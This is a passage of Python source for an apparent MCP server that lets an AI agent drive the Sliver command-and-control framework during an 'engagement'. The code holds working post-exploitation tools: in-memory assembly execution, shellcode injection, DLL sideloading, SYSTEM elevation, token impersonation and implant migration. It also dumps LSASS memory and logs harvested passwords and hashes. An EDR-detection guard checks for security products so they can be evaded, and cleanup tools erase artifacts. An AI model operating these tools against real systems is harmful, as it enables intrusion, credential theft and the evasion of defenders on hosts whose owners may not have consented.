    is_admin = "S-1-5-32-544" in groups_text or "administrator" in groups_text.lower()
    return {
        "is_admin": is_admin,
        "uac_enabled": uac_enabled,
        "always_install_elevated": always_install,
        "potential_vectors": vectors,
        "unquoted_service_count": len(unquoted_lines),
        "recommended_next_steps": (
            ["Already admin - focus on credential access and persistence."]
            if is_admin else
            (vectors if vectors else ["No obvious privesc vectors found; review raw sections."])
        ),
    }


def _summarize_cred_harvest(results: dict[str, str]) -> dict[str, Any]:
    """Build actionable summary from credential harvest playbook output."""
    cmdkey = results.get("cmdkey_list", "")
    cred_count = cmdkey.lower().count("target:")
    wifi = results.get("wifi_profiles", "")
    wifi_count = wifi.lower().count("all user profile")
    has_sam = "sam" in results.get("sam_backup_check", "").lower()
    has_chrome = "login data" in results.get("chrome_logins", "").lower()
    has_edge = "login data" in results.get("edge_logins", "").lower()
    has_firefox = "logins.json" in results.get("firefox_profiles", "").lower()
    findings: list[str] = []
    if cred_count:
        findings.append(f"{cred_count} stored credential(s) in cmdkey")
    if wifi_count:
        findings.append(f"{wifi_count} Wi-Fi profile(s)")
    if has_sam:
        findings.append("SAM backup file present")
    if has_chrome or has_edge or has_firefox:
        findings.append("Browser credential stores found")
    return {
        "stored_credentials": cred_count,
        "wifi_profiles": wifi_count,
        "sam_backup_present": has_sam,
        "browser_stores": {
            "chrome": has_chrome,
            "edge": has_edge,
            "firefox": has_firefox,
        },
        "actionable_findings": findings,
        "recommended_next_steps": [
            "Review cmdkey and vault output for reusable credentials.",
            "Consider sliver_process_dump for LSASS after OPSEC check.",
        ] if findings else ["No obvious credential stores found in quick scan."],
    }


def _summarize_persist_check(results: dict[str, str]) -> dict[str, Any]:
    """Build actionable summary from persistence check playbook output."""
    run_keys = sum(
        1 for key in ("run_keys_hklm", "run_keys_hkcu", "runonce_hklm", "runonce_hkcu")
        if results.get(key, "").strip() and "ERROR" not in results.get(key, "").upper()
    )
    startup_entries = sum(
        1 for key in ("startup_folder_user", "startup_folder_all")
        if results.get(key, "").strip() and "<DIR>" not in results.get(key, "").upper()
        and "Volume in drive" not in results.get(key, "")
    )
    wmi_text = results.get("wmi_subscriptions", "")
    wmi_count = wmi_text.count("CommandLineTemplate") - 1 if wmi_text else 0
    existing: list[str] = []
    if run_keys:
        existing.append(f"{run_keys} Run/RunOnce registry key(s) with entries")
    if startup_entries:
        existing.append("Startup folder entries present")
    if wmi_count > 0:
        existing.append(f"{wmi_count} WMI subscription(s)")
    return {
        "run_key_sections_with_data": run_keys,
        "startup_folder_entries": startup_entries > 0,
        "wmi_subscriptions": max(wmi_count, 0),
        "existing_persistence_indicators": existing,
        "recommended_next_steps": [
            "Review Run keys and scheduled tasks for implant persistence opportunities.",
            "Check services and WMI subscriptions for stealthy persistence options.",
        ],
    }


def _format_playbook_result(
    playbook: str,
    summary: dict[str, Any],
    sections: dict[str, str],
) -> str:
    """Return structured JSON for playbook results with summary at top."""
    return _json_out({
        "playbook": playbook,
        "summary": summary,
        "sections": sections,
    })


@mcp.tool()
async def sliver_state_add_target(
    hostname: str,
    ip: str = "",
    os: str = "",
    domain: str = "",
    access_level: str = "none",
    notes: str = "",
) -> str:
    """Add or update a target in the engagement state database.

    If a target with the same hostname already exists, it will be updated.

    Args:
        hostname: Target hostname.
        ip: Target IP address.
        os: Operating system.
        domain: Domain membership.
        access_level: Current access level (none/user/admin/system).
        notes: Free-form notes.
    """
    db = _get_state_db()
    existing = db.execute(
        "SELECT id FROM targets WHERE hostname = ?", (hostname,)
    ).fetchone()
    if existing:
        db.execute(
            "UPDATE targets SET ip=?, os=?, domain=?, access_level=?, notes=?, "
            "updated_at=datetime('now') WHERE id=?",
            (ip, os, domain, access_level, notes, existing["id"]),
        )
        db.commit()
        return f"Updated target '{hostname}' (id={existing['id']})."
    cur = db.execute(
        "INSERT INTO targets (hostname, ip, os, domain, access_level, notes) "
        "VALUES (?, ?, ?, ?, ?, ?)",
        (hostname, ip, os, domain, access_level, notes),
    )
    db.commit()
    return f"Added target '{hostname}' (id={cur.lastrowid})."


@mcp.tool()
async def sliver_state_targets() -> str:
    """List all tracked targets from the engagement state database."""
    db = _get_state_db()
    rows = db.execute("SELECT * FROM targets ORDER BY id").fetchall()
    if not rows:
        return "No targets tracked yet."
    return json.dumps([dict(r) for r in rows], indent=2)


@mcp.tool()
async def sliver_state_add_cred(
    username: str,
    secret: str,
    domain: str = "",
    cred_type: str = "plaintext",
    source: str = "",
    target_hostname: str = "",
) -> str:
    """Log a harvested credential to the engagement state database.

    Args:
        username: Username or account name.
        secret: Password, hash, or key material.
        domain: Domain the credential belongs to.
        cred_type: Type of credential (plaintext/ntlm/kerberos/ssh_key/certificate).
        source: Where the credential was obtained (e.g. 'lsass', 'sam', 'mimikatz').
        target_hostname: Hostname of the target the cred was harvested from.
    """
    db = _get_state_db()
    target_id = None
    if target_hostname:
        row = db.execute(
            "SELECT id FROM targets WHERE hostname = ?", (target_hostname,)
        ).fetchone()
        if row:
            target_id = row["id"]
    cur = db.execute(
        "INSERT INTO credentials (username, secret, domain, cred_type, source, target_id) "
        "VALUES (?, ?, ?, ?, ?, ?)",
        (username, secret, domain, cred_type, source, target_id),
    )
    db.commit()
    return f"Credential logged: {domain}\\{username} (id={cur.lastrowid}, type={cred_type})."


@mcp.tool()
async def sliver_state_creds(domain: str = "", cred_type: str = "") -> str:
    """List harvested credentials from the engagement state database.

    Args:
        domain: Filter by domain (optional).
        cred_type: Filter by credential type (optional).
    """
    db = _get_state_db()
    query = "SELECT c.*, t.hostname as target FROM credentials c LEFT JOIN targets t ON c.target_id = t.id WHERE 1=1"
    params: list[str] = []
    if domain:
        query += " AND c.domain = ?"
        params.append(domain)
    if cred_type:
        query += " AND c.cred_type = ?"
        params.append(cred_type)
    query += " ORDER BY c.id"
    rows = db.execute(query, params).fetchall()
    if not rows:
        return "No credentials logged yet."
    return json.dumps([dict(r) for r in rows], indent=2)


@mcp.tool()
async def sliver_state_add_finding(
    title: str,
    severity: str = "info",
    description: str = "",
    evidence_path: str = "",
    target_hostname: str = "",
) -> str:
    """Log an engagement finding to the state database.

    Args:
        title: Short title for the finding.
        severity: Severity level (critical/high/medium/low/info).
        description: Detailed description.
        evidence_path: Path to evidence file or screenshot.
        target_hostname: Hostname of the affected target.
    """
    db = _get_state_db()
    target_id = None
    if target_hostname:
        row = db.execute(
            "SELECT id FROM targets WHERE hostname = ?", (target_hostname,)
        ).fetchone()
        if row:
            target_id = row["id"]
    cur = db.execute(
        "INSERT INTO findings (title, severity, description, evidence_path, target_id) "
        "VALUES (?, ?, ?, ?, ?)",
        (title, severity, description, evidence_path, target_id),
    )
    db.commit()
    return f"Finding logged: [{severity.upper()}] {title} (id={cur.lastrowid})."


@mcp.tool()
async def sliver_state_findings(severity: str = "") -> str:
    """List engagement findings from the state database.

    Args:
        severity: Filter by severity level (optional).
    """
    db = _get_state_db()
    query = "SELECT f.*, t.hostname as target FROM findings f LEFT JOIN targets t ON f.target_id = t.id WHERE 1=1"
    params: list[str] = []
    if severity:
        query += " AND f.severity = ?"
        params.append(severity)
    query += " ORDER BY f.id"
    rows = db.execute(query, params).fetchall()
    if not rows:
        return "No findings logged yet."
    return json.dumps([dict(r) for r in rows], indent=2)


@mcp.tool()
async def sliver_state_log_access(
    session_id: str,
    target_hostname: str = "",
    method: str = "",
    status: str = "active",
) -> str:
    """Log an access event in the engagement state database.

    Automatically called when sessions connect, but can also be used manually.

    Args:
        session_id: Sliver session or beacon ID.
        target_hostname: Hostname of the target accessed.
        method: Access method (e.g. 'phishing', 'exploit', 'lateral_movement').
        status: Access status (active/lost/cleaned).
    """
    db = _get_state_db()
    target_id = None
    if target_hostname:
        row = db.execute(
            "SELECT id FROM targets WHERE hostname = ?", (target_hostname,)
        ).fetchone()
        if row:
            target_id = row["id"]
    cur = db.execute(
        "INSERT INTO access_log (session_id, target_id, method, status) "
        "VALUES (?, ?, ?, ?)",
        (session_id, target_id, method, status),
    )
    db.commit()
    return f"Access event logged (id={cur.lastrowid}): session={session_id}, status={status}."


@mcp.tool()
async def sliver_state_summary() -> str:
    """Get an engagement dashboard summary with counts and key stats."""
    db = _get_state_db()
    targets = db.execute("SELECT COUNT(*) as c FROM targets").fetchone()["c"]
    targets_admin = db.execute(
        "SELECT COUNT(*) as c FROM targets WHERE access_level IN ('admin', 'system')"
    ).fetchone()["c"]
    creds = db.execute("SELECT COUNT(*) as c FROM credentials").fetchone()["c"]
    findings = db.execute("SELECT COUNT(*) as c FROM findings").fetchone()["c"]
    critical = db.execute(
        "SELECT COUNT(*) as c FROM findings WHERE severity = 'critical'"
    ).fetchone()["c"]
    high = db.execute(
        "SELECT COUNT(*) as c FROM findings WHERE severity = 'high'"
    ).fetchone()["c"]
    accesses = db.execute("SELECT COUNT(*) as c FROM access_log").fetchone()["c"]
    active = db.execute(
        "SELECT COUNT(*) as c FROM access_log WHERE status = 'active'"
    ).fetchone()["c"]

    summary = {
        "targets": {"total": targets, "admin_or_system": targets_admin},
        "credentials": {"total": creds},
        "findings": {"total": findings, "critical": critical, "high": high},
        "access_events": {"total": accesses, "active": active},
    }
    return json.dumps(summary, indent=2)


@mcp.tool()
async def sliver_state_export() -> str:
    """Export the full engagement state to JSON for reporting.

    Returns a JSON object containing all targets, credentials, findings,
    access logs, and pivot paths.
    """
    db = _get_state_db()
    export = {
        "exported_at": datetime.now(tz=timezone.utc).isoformat(),
        "targets": [dict(r) for r in db.execute("SELECT * FROM targets").fetchall()],
        "credentials": [
            dict(r) for r in db.execute(
                "SELECT c.*, t.hostname as target FROM credentials c "
                "LEFT JOIN targets t ON c.target_id = t.id"
            ).fetchall()
        ],
        "findings": [
            dict(r) for r in db.execute(
                "SELECT f.*, t.hostname as target FROM findings f "
                "LEFT JOIN targets t ON f.target_id = t.id"
            ).fetchall()
        ],
        "access_log": [
            dict(r) for r in db.execute(
                "SELECT a.*, t.hostname as target FROM access_log a "
                "LEFT JOIN targets t ON a.target_id = t.id"
            ).fetchall()
        ],
        "pivot_paths": [
            dict(r) for r in db.execute(
                "SELECT p.*, s.hostname as source, d.hostname as dest "
                "FROM pivot_paths p "
                "LEFT JOIN targets s ON p.source_target_id = s.id "
                "LEFT JOIN targets d ON p.dest_target_id = d.id"
            ).fetchall()
        ],
    }
    return json.dumps(export, indent=2)


@mcp.tool()
async def sliver_state_add_pivot(
    source_hostname: str,
    dest_hostname: str,
    method: str = "",
    status: str = "planned",
) -> str:
    """Record a pivot path between two targets in the state database.

    Args:
        source_hostname: Hostname of the source target.
        dest_hostname: Hostname of the destination target.
        method: Pivot method (e.g. 'smb', 'wmi', 'psexec', 'ssh').
        status: Pivot status (planned/active/completed/failed).
    """
    db = _get_state_db()
    src = db.execute("SELECT id FROM targets WHERE hostname = ?", (source_hostname,)).fetchone()
    dst = db.execute("SELECT id FROM targets WHERE hostname = ?", (dest_hostname,)).fetchone()
    if not src:
        return f"Source target '{source_hostname}' not found. Add it first with sliver_state_add_target."
    if not dst:
        return f"Destination target '{dest_hostname}' not found. Add it first with sliver_state_add_target."
    cur = db.execute(
        "INSERT INTO pivot_paths (source_target_id, dest_target_id, method, status) VALUES (?, ?, ?, ?)",
        (src["id"], dst["id"], method, status),
    )
    db.commit()
    return f"Pivot path logged: {source_hostname} -> {dest_hostname} via {method} (id={cur.lastrowid})."


@mcp.tool()
async def sliver_state_auto_discover() -> str:
    """Auto-populate the state DB from all current session metadata.

    Reads every active Sliver session and upserts hostname, OS, IP (from
    remote address), and access level into the engagement state database.
    Also logs an access event for each session.
    """
    try:
        client = await _get_client()
        sessions = await client.sessions()
        if not sessions:
            return _json_out({
                "status": "ok",
                "count": 0,
                "message": "No active sessions to discover.",
                "registered": [],
            })
        registered: list[dict[str, Any]] = []
        for s in sessions:
            try:
                registered.append(_register_session_target(s, s.ID, "auto_discover"))
            except Exception as exc:
                registered.append({
                    "session_id": s.ID,
                    "action": "error",
                    "message": str(exc),
                })
        added = sum(1 for r in registered if r.get("action") == "added")
        updated = sum(1 for r in registered if r.get("action") == "updated")
        return _json_out({
            "status": "ok",
            "count": len(sessions),
            "summary": {"added": added, "updated": updated, "errors": len(registered) - added - updated},
            "registered": registered,
        })
    except Exception as e:
        return _format_tool_error("sliver_state_auto_discover", e, hints=[
            "Run sliver_status to verify server connectivity.",
            "Ensure at least one implant has called back with sliver_sessions.",
        ])


# =========================================================================
#  OPSEC GUARD
# =========================================================================

_edr_signatures: dict[str, list[str]] = {}
_high_risk_tools: list[str] = []


def _normalize_process_list(ps_result: Any) -> list[Any]:
    """Normalize the ps() return value into a flat list of process objects.

    sliver-py may return a list directly or a wrapper with a .Processes attribute
    depending on the version. This handles both shapes defensively (SEC-3).
    """
    if ps_result is None:
        return []
    if isinstance(ps_result, list):
        return ps_result
    procs = getattr(ps_result, "Processes", None)
    if procs is not None:
        return list(procs)
    try:
        return list(ps_result)
    except TypeError:
        return []


def _load_edr_config() -> None:
    """Load EDR process signatures from edr_processes.json."""
    global _edr_signatures, _high_risk_tools
    config_path = Path(__file__).parent / "edr_processes.json"
    if not config_path.exists():
        return
    try:
        data = json.loads(config_path.read_text())
        _edr_signatures = data.get("edr_signatures", {})
        _high_risk_tools = data.get("high_risk_tools", [])
    except Exception:
        pass


_load_edr_config()


async def _opsec_scan_session(session_id: str) -> dict[str, Any]:
    """Scan a session's process list for known EDR/AV products.

    Returns a dict with 'detected' (list of product dicts) and 'safe' (bool).
    """
    detected: list[dict[str, str]] = []
    try:
        session = await _interact(session_id)
        ps_result = await session.ps()
        procs = _normalize_process_list(ps_result)
        proc_names = {getattr(p, "Executable", "").lower() for p in procs}

        for product, signatures in _edr_signatures.items():
            for sig in signatures:
                if sig.lower() in proc_names:
                    detected.append({"product": product, "process": sig})
    except Exception as e:
        return {"detected": [], "safe": False, "error": str(e)}

    return {"detected": detected, "safe": len(detected) == 0}


async def _opsec_preflight(session_id: str, tool_name: str) -> str | None:
    """Run OPSEC pre-flight check before a high-risk tool execution.

    Returns a warning/block message, or None if safe to proceed.
    """
    if OPSEC_MODE == "silent":
        return None
    if tool_name not in _high_risk_tools:
        return None

    scan = await _opsec_scan_session(session_id)
    if scan["safe"]:
        return None

    products = ", ".join(
        f"{d['product']} ({d['process']})" for d in scan["detected"]
    )
    msg = f"[OPSEC WARNING] EDR/AV detected on target: {products}. Tool '{tool_name}' is high-risk."

    if OPSEC_MODE == "block":
        return f"[OPSEC BLOCKED] {msg} Execution blocked. Set SLIVER_OPSEC_MODE=warn to override."
    return f"{msg} Proceeding with caution (mode=warn)."


@mcp.tool()
async def sliver_opsec_check(session_id: str) -> str:
    """Scan a target session for EDR/AV products before running high-risk commands.

    Checks the process list against a database of known security product processes
    including CrowdStrike, SentinelOne, Carbon Black, Defender ATP, Cortex XDR,
    Elastic, Cylance, ESET, Sophos, Kaspersky, Symantec, Trend Micro, FireEye,
    Wazuh, Velociraptor, and Sysmon.

    Args:
        session_id: Session ID of the target to scan.
    """
    scan = await _opsec_scan_session(session_id)

    if "error" in scan:
        return f"OPSEC scan error: {scan['error']}"

    if scan["safe"]:
        result = {
            "status": "CLEAR",
            "message": "No known EDR/AV products detected in process list.",
            "opsec_mode": OPSEC_MODE,
        }
    else:
        by_product: dict[str, list[str]] = {}
        for d in scan["detected"]:
            by_product.setdefault(d["product"], []).append(d["process"])
        result = {
            "status": "DETECTED",
            "message": f"Found {len(scan['detected'])} EDR/AV processes across {len(by_product)} products.",
            "products": by_product,
            "opsec_mode": OPSEC_MODE,
            "recommendation": "Use with extreme caution. Consider BOF or in-memory techniques.",
        }
    return json.dumps(result, indent=2)


# =========================================================================
#  CLEANUP TOOLS
# =========================================================================

_DEFAULT_CLEANUP_PATHS = [
    r"C:\Users\Public\loader_remote.exe",
    r"C:\Users\Public\loader_local.exe",
    r"C:\Users\Public\payload.enc",
    r"C:\Temp\payload.enc",
    r"C:\Temp\loader_remote.exe",
    r"C:\Temp\loader_local.exe",
]


def _load_cleanup_paths() -> list[str]:
    """Load cleanup paths from cleanup_manifest.json if it exists, else defaults."""
    manifest = Path(PROJECT_ROOT) / "cleanup_manifest.json"
    if manifest.exists():
        try:
            return json.loads(manifest.read_text())
        except Exception:
            pass
    return _DEFAULT_CLEANUP_PATHS


_CLEANUP_PATHS = _load_cleanup_paths()


@mcp.tool()
async def sliver_cleanup_target(session_id: str) -> str:
    """Remove all engagement artifacts from a compromised target and check for persistence.

    Deletes loaders, payloads, and scripts from standard drop locations
    (configured via cleanup_manifest.json). Checks for suspicious scheduled tasks.

    Args:
        session_id: Session ID of the target to clean up.
    """
    report: dict[str, Any] = {"deleted": [], "not_found": [], "errors": []}

    for fpath in _CLEANUP_PATHS:
        try:
            session = await _interact(session_id)
            await session.rm(fpath, force=True)
            report["deleted"].append(fpath)
        except Exception:
            report["not_found"].append(fpath)

    # Check for persistence
    try:
        output = await _exec_on_session(
            session_id, "schtasks", ["/query", "/fo", "LIST"]
        )
        suspicious = []
        for line in output.splitlines():
            low = line.lower()
            if any(kw in low for kw in ["loader", "payload", "implant", "sliver", "beacon"]):
                suspicious.append(line.strip())
        report["scheduled_task_check"] = suspicious if suspicious else "clean"
    except Exception as e:
        report["scheduled_task_check"] = f"check failed: {e}"

    # Verify remaining artifacts
    try:
        output = await _exec_on_session(
            session_id, "cmd.exe", ["/c", "dir", r"C:\Users\Public\*.exe", r"C:\Users\Public\*.bat", r"C:\Users\Public\*.enc"]
        )
        report["remaining_artifacts"] = output.strip() if output.strip() else "none"
    except Exception:
        report["remaining_artifacts"] = "check failed"

    return json.dumps(report, indent=2)


@mcp.tool()
async def sliver_full_cleanup() -> str:
    """End-of-engagement cleanup: kill all sessions, stop all listeners, report final state."""
    client = await _get_client()
    report: dict[str, Any] = {"sessions_killed": [], "jobs_stopped": [], "errors": []}

    # Kill all sessions
    try:
        sessions = await client.sessions()
        if sessions:
            for s in sessions:
                try:
                    await client.kill_session(s.ID)
                    report["sessions_killed"].append({"id": s.ID, "hostname": s.Hostname})
                except Exception as e:
                    report["errors"].append(f"kill session {s.ID}: {e}")
    except Exception as e:
        report["errors"].append(f"list sessions: {e}")

    # Stop all jobs
    try:
        jobs = await client.jobs()
        active = jobs.Active if hasattr(jobs, "Active") else jobs
        if active:
            for j in active:
                try:
                    await client.kill_job(j.ID)
                    report["jobs_stopped"].append({"id": j.ID, "name": j.Name})
                except Exception as e:
                    report["errors"].append(f"kill job {j.ID}: {e}")
    except Exception as e:
        report["errors"].append(f"list jobs: {e}")

    report["status"] = "cleanup complete" if not report["errors"] else "cleanup completed with errors"
    return json.dumps(report, indent=2)


# =========================================================================
#  ADVANCED IMPLANT COMMANDS
# =========================================================================


@mcp.tool()
async def sliver_terminate_process(session_id: str, pid: int, force: bool = False) -> str:
    """Kill a process on the remote system by PID.

    Args:
        session_id: Target session ID.
        pid: Process ID to terminate.
        force: Force termination. Default false.
    """
    try:
        session = await _interact(session_id)
        await session.terminate(pid, force=force)
        return f"Process {pid} terminated on session {session_id}."
    except Exception as e:
        return f"Failed to terminate process {pid}: {e}"


@mcp.tool()
async def sliver_impersonate(session_id: str, username: str) -> str:
    """Impersonate a Windows user via token manipulation (Windows only).

    Args:
        session_id: Target session ID.
        username: Username to impersonate (e.g. 'DOMAIN\\\\user' or 'user').
    """
    try:
        session = await _interact(session_id)
        await session.impersonate(username)
        return f"Now impersonating {username} on session {session_id}."
    except Exception as e:
        return _format_tool_error("sliver_impersonate", e, session_id=session_id, context=f"username={username!r}")


@mcp.tool()
async def sliver_revert_to_self(session_id: str) -> str:
    """Revert from an impersonated user context back to the original token (Windows only).

    Args:
        session_id: Target session ID.
    """
    try:
        session = await _interact(session_id)
        await session.revert_to_self()
        return f"Reverted to original token on session {session_id}."
    except Exception as e:
        return _format_tool_error("sliver_revert_to_self", e, session_id=session_id)


@mcp.tool()
async def sliver_registry_read(
    session_id: str,
    hive: str,
    reg_path: str,
    key: str,
    hostname: str = "",
) -> str:
    """Read a Windows registry value from the remote system.

    Args:
        session_id: Target session ID.
        hive: Registry hive (e.g. 'HKLM', 'HKCU', 'HKCR').
        reg_path: Registry path (e.g. 'SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion').
        key: Key/value name to read.
        hostname: Remote hostname for remote registry. Default: local.
    """
    try:
        session = await _interact(session_id)
        result = await session.registry_read(hive, reg_path, key, hostname or "")
        return json.dumps(
            {
                "hive": hive,
                "path": reg_path,
                "key": key,
                "value": getattr(result, "Value", ""),
            },
            indent=2,
        )
    except Exception as e:
        return _format_tool_error(
            "sliver_registry_read", e, session_id=session_id,
            context=f"{hive}\\{reg_path}\\{key}",
        )


@mcp.tool()
async def sliver_get_env(session_id: str, name: str = "") -> str:
    """Get environment variables from the remote system.

    Args:
        session_id: Target session ID.
        name: Specific variable name to retrieve. If empty, returns all variables.
    """
    try:
        session = await _interact(session_id)
        result = await session.get_env(name or "")
        variables = getattr(result, "Variables", [])
        if not variables:
            return f"No environment variables returned for '{name}'."
        rows = []
        for v in variables:
            rows.append({"key": v.Key, "value": v.Value})
        return json.dumps(rows, indent=2)
    except Exception as e:
        return _format_tool_error("sliver_get_env", e, session_id=session_id, context=f"name={name!r}")


@mcp.tool()
async def sliver_implant_builds() -> str:
    """List all historical implant builds stored on the Sliver server."""
    try:
        client = await _get_client()
        builds = await client.implant_builds()
        if not builds:
            return "No implant builds found."
        rows = []
        for name, config in builds.items():
            rows.append({
                "name": name,
                "os": getattr(config, "GOOS", ""),
                "arch": getattr(config, "GOARCH", ""),
                "format": getattr(config, "Format", ""),
                "c2": [
                    {"url": getattr(c, "URL", ""), "priority": getattr(c, "Priority", 0)}
                    for c in getattr(config, "C2", [])
                ],
            })
        return json.dumps(rows, indent=2)
    except Exception as e:
        return f"Failed to list implant builds: {e}"


# =========================================================================
#  EXECUTE-ASSEMBLY / SHELLCODE / SIDELOAD
# =========================================================================


@mcp.tool()
async def sliver_execute_assembly(
    session_id: str,
    assembly_path: str,
    args: str = "",
    process: str = "",
    is_dll: bool = False,
) -> str:
    """Execute a .NET assembly in-memory on the remote system (Windows only).

    Used for running tools like Rubeus, Seatbelt, SharpHound, etc. without
    dropping files to disk.

    Args:
        session_id: Target session ID.
        assembly_path: Local path to the .NET assembly (.exe or .dll).
        args: Arguments to pass to the assembly. Default: empty.
        process: Host process to spawn the assembly in. Default: Sliver's default.
        is_dll: Set true if the assembly is a DLL (uses a different loader). Default: false.
    """
    try:
        block = await _opsec_preflight(session_id, "sliver_execute_assembly")
        if block and OPSEC_MODE == "block":
            return block
        data = Path(assembly_path).read_bytes()
        session = await _interact(session_id)
        kwargs: dict[str, Any] = {"arguments": args, "is_dll": is_dll}
        if process:
            kwargs["process"] = process
        result = await session.execute_assembly(data, **kwargs)
        output = getattr(result, "Output", b"")
        if isinstance(output, bytes):
            output = output.decode("utf-8", errors="replace")
        prefix = f"{block}\n\n" if block else ""
        return prefix + (output if output else "(assembly returned no output)")
    except FileNotFoundError:
        return f"Local assembly not found: {assembly_path}"
    except Exception as e:
        return _format_tool_error(
            "sliver_execute_assembly", e, session_id=session_id,
            context=f"assembly={assembly_path!r}",
            hints=["Ensure the assembly path exists locally and is a valid .NET binary."],
        )


@mcp.tool()
async def sliver_execute_shellcode(
    session_id: str,
    shellcode_path: str,
    rwx_pages: bool = False,
    pid: int = 0,
) -> str:
    """Inject and execute shellcode on the remote system.

    Args:
        session_id: Target session ID.
        shellcode_path: Local path to the raw shellcode file.
        rwx_pages: Use RWX memory pages (more detectable). Default: false.
        pid: PID of process to inject into. 0 = spawn new process. Default: 0.
    """
    try:
        block = await _opsec_preflight(session_id, "sliver_execute_shellcode")
        if block and OPSEC_MODE == "block":
            return block
        data = Path(shellcode_path).read_bytes()
        session = await _interact(session_id)
        result = await session.execute_shellcode(data, rwx=rwx_pages, pid=pid)
        prefix = f"{block}\n\n" if block else ""
        return prefix + json.dumps({
            "status": "injected",
            "size": len(data),
            "pid": pid or "(new process)",
        }, indent=2)
    except FileNotFoundError:
        return f"Shellcode file not found: {shellcode_path}"
    except Exception as e:
        return _format_tool_error(
            "sliver_execute_shellcode", e, session_id=session_id,
            context=f"shellcode={shellcode_path!r} pid={pid}",
        )


@mcp.tool()
async def sliver_sideload(
    session_id: str,
    dll_path: str,
    entry_point: str = "",
    args: str = "",
    process: str = "",
) -> str:
    """Sideload a shared library (DLL) into a process on the remote system.

    Args:
        session_id: Target session ID.
        dll_path: Local path to the DLL file.
        entry_point: Export function name to call. Default: empty (DllMain).
        args: Arguments to pass to the entry point. Default: empty.
        process: Host process to inject into. Default: Sliver's default.
    """
    try:
        block = await _opsec_preflight(session_id, "sliver_sideload")
        if block and OPSEC_MODE == "block":
            return block
        data = Path(dll_path).read_bytes()
        session = await _interact(session_id)
        kwargs: dict[str, Any] = {}
        if entry_point:
            kwargs["entry_point"] = entry_point
        if args:
            kwargs["arguments"] = args
        if process:
            kwargs["process"] = process
        result = await session.sideload(data, **kwargs)
        output = getattr(result, "Output", b"")
        if isinstance(output, bytes):
            output = output.decode("utf-8", errors="replace")
        prefix = f"{block}\n\n" if block else ""
        return prefix + (output if output else "(sideload returned no output)")
    except FileNotFoundError:
        return f"DLL not found: {dll_path}"
    except Exception as e:
        return _format_tool_error("sliver_sideload", e, session_id=session_id)


# =========================================================================
#  PRIVILEGE ESCALATION / TOKEN MANIPULATION
# =========================================================================


@mcp.tool()
async def sliver_get_system(session_id: str, process: str = "") -> str:
    """Attempt to elevate to NT AUTHORITY\\SYSTEM via named pipe impersonation (Windows only).

    Args:
        session_id: Target session ID (must have admin privileges).
        process: Host process for the elevation technique. Default: Sliver's default.
    """
    try:
        block = await _opsec_preflight(session_id, "sliver_get_system")
        if block and OPSEC_MODE == "block":
            return block
        session = await _interact(session_id)
        kwargs: dict[str, Any] = {}
        if process:
            kwargs["process"] = process
        result = await session.get_system(**kwargs)
        prefix = f"{block}\n\n" if block else ""
        return prefix + "Elevated to SYSTEM successfully."
    except Exception as e:
        return _format_tool_error("sliver_get_system", e, session_id=session_id)


@mcp.tool()
async def sliver_make_token(
    session_id: str,
    username: str,
    password: str,
    domain: str = ".",
) -> str:
    """Create a Windows logon token with explicit credentials (logon type 9 / runas /netonly).

    Useful for accessing network resources with different credentials.

    Args:
        session_id: Target session ID.
        username: Username for the token.
        password: Password for the token.
        domain: Domain name. Default: '.' (local machine).
    """
    try:
        block = await _opsec_preflight(session_id, "sliver_make_token")
        if block and OPSEC_MODE == "block":
            return block
        session = await _interact(session_id)
        await session.make_token(username, password, domain)
        prefix = f"{block}\n\n" if block else ""
        return prefix + f"Token created for {domain}\\{username} on session {session_id}."
    except Exception as e:
        return _format_tool_error("sliver_make_token", e, session_id=session_id)


@mcp.tool()
async def sliver_run_as(
    session_id: str,
    username: str,
    password: str,
    exe: str,
    args: str = "",
    domain: str = ".",
) -> str:
    """Execute a command as a different user using explicit credentials (Windows only).

    Args:
        session_id: Target session ID.
        username: Username to run as.
        password: Password for the user.
        exe: Executable to run.
        args: Arguments to pass. Default: empty.
        domain: Domain name. Default: '.' (local machine).
    """
    try:
        session = await _interact(session_id)
        result = await session.run_as(exe, shlex.split(args) if args else [], username, password, domain)
        output = getattr(result, "Output", b"")
        if isinstance(output, bytes):
            output = output.decode("utf-8", errors="replace")
        return output if output else "(run_as completed, no output returned)"
    except Exception as e:
        return _format_tool_error("sliver_run_as", e, session_id=session_id)


# =========================================================================
#  PROCESS / MEMORY
# =========================================================================


@mcp.tool()
async def sliver_migrate(
    session_id: str,
    pid: int,
) -> str:
    """Migrate the implant into another process (Windows only).

    Warning: migration abandons the current process. If it fails, the session
    may be lost.

    Args:
        session_id: Target session ID.
        pid: PID of the target process to migrate into.
    """
    try:
        block = await _opsec_preflight(session_id, "sliver_migrate")
        if block and OPSEC_MODE == "block":
            return block

        client = await _get_client()
        sessions = await client.sessions()
        sess_info = None
        for s in sessions:
            if s.ID == session_id:
                sess_info = s
                break
        if sess_info is None:
            return _format_tool_error(
                "sliver_migrate", ValueError("Session not found"),
                session_id=session_id, context=f"pid={pid}",
            )

        c2_url = getattr(sess_info, "ActiveC2", "") or ""
        if not c2_url:
            return _format_tool_error(
                "sliver_migrate",
                ValueError("No ActiveC2 URL on session. Cannot migrate without a valid C2 endpoint."),
                session_id=session_id,
                context=f"pid={pid}",
            )
        goos = sess_info.OS or "windows"
        goarch = sess_info.Arch or "amd64"

        config_bytes = b""
        config_bytes += _pb_string(7, goos)
        config_bytes += _pb_string(8, goarch)
        config_bytes += _pb_submsg(50, _build_implant_c2(c2_url))
        config_bytes += _pb_varint(100, int(cpb.SHELLCODE))
        config_bytes += _pb_bool(104, True)
        config_bytes += _pb_string(150, "default")

        config = cpb.ImplantConfig()
        config.ParseFromString(config_bytes)

        session = await _interact(session_id)
        result = await session.migrate(pid, config)
        prefix = f"{block}\n\n" if block else ""
        return prefix + json.dumps({
            "status": "migrated",
            "old_session": session_id,
            "target_pid": pid,
            "c2_url": c2_url,
            "note": "A new session should appear shortly from the target process.",
        }, indent=2)
    except Exception as e:
        return _format_tool_error("sliver_migrate", e, session_id=session_id, context=f"pid={pid}")


@mcp.tool()
async def sliver_process_dump(
    session_id: str,
    pid: int,
    save_to: str = "/tmp/procdump.dmp",
) -> str:
    """Dump the memory of a remote process (e.g. LSASS for credential extraction).

    Args:
        session_id: Target session ID.
        pid: PID of the process to dump.
        save_to: Local path to save the dump file. Default: /tmp/procdump.dmp.
    """
    try:
        block = await _opsec_preflight(session_id, "sliver_process_dump")
        if block and OPSEC_MODE == "block":
            return block
        session = await _interact(session_id)
        result = await session.process_dump(pid)
        data = getattr(result, "Data", b"")
        if not data:
            return f"Process dump for PID {pid} returned no data."
        Path(save_to).write_bytes(data)
